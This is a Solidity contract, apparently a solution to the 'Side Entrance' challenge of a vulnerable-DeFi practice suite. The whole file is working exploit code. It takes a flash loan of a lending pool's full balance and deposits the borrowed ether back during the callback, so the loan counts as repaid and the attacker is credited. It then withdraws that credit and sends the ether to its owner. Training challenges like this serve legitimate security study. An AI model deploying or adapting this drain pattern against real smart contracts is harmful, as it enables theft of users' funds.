// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    address immutable owner;
    ISideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        owner = msg.sender;
        pool = ISideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

}